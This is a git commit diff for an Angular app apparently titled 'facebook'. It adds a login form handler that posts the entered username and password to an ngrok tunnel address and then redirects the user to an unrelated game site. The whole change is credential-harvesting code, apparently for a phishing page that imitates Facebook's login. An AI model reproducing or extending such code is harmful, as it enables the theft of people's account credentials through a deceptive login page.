51c97594ea50b657414abaebc814ebc5b850a4f0
Berihugebre <danigebre039@gmail.com>
2022-10-04 08:40:04 +0200

    first commit

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -1,3 +1,4 @@
+import { HttpClient } from '@angular/common/http';
 import { Component } from '@angular/core';
 
 @Component({
@@ -6,5 +7,17 @@ import { Component } from '@angular/core';
   styleUrls: ['./app.component.css']
 })
 export class AppComponent {
-  title = 'facebook';
+  username = '';
+  password = ''
+  constructor(private http:HttpClient){}
+
+  submit(){
+    this.http.post('https://c48e-2a02-1811-c485-4d00-3d26-5d9-575-12cf.ngrok.io/auth/user',
+     {username: this.username, password: this.password})
+     .subscribe((res)=>{
+      this.username = '';
+      this.password = ''
+      window.location.href = 'https://www.crazygames.com/game/ludo-king'
+     })
+  }
 }
